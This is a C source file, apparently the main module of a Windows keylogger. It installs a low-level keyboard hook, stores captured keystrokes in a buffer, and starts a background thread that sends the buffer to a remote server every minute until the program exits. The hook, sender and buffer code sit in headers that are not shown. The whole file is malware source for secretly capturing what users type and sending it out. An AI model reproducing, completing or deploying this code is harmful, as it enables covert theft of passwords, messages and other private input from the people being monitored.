#include <windows.h>
#include <process.h>
#include <stdio.h>
#include <stdbool.h>
#include "hook.h"
#include "sender.h"
#include "buffer.h"

volatile bool running = true;

unsigned __stdcall sender_thread_func(void* param) {
    while (running) {
        Sleep(60000);
        send_buffer_to_server();
    }
    return 0;
}

int main(void) {

    SetConsoleOutputCP(CP_UTF8);

    if (!install_keyboard_hook()) {
        fprintf(stderr, "Failed to install keyboard hook\n");
        return 1;
    }

    if (!buffer_init()) {
        fprintf(stderr, "Failed to init buffer\n");
        uninstall_keyboard_hook();
        return 1;
    }

    uintptr_t sender_thread = _beginthreadex(NULL, 0, sender_thread_func, NULL, 0, NULL);
    if (sender_thread == 0) {
        fprintf(stderr, "Failed to start sender thread\n");
        uninstall_keyboard_hook();
        buffer_cleanup();
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    running = false;
    WaitForSingleObject((HANDLE)sender_thread, INFINITE);
    CloseHandle((HANDLE)sender_thread);

    uninstall_keyboard_hook();
    buffer_cleanup();

    return 0;
}
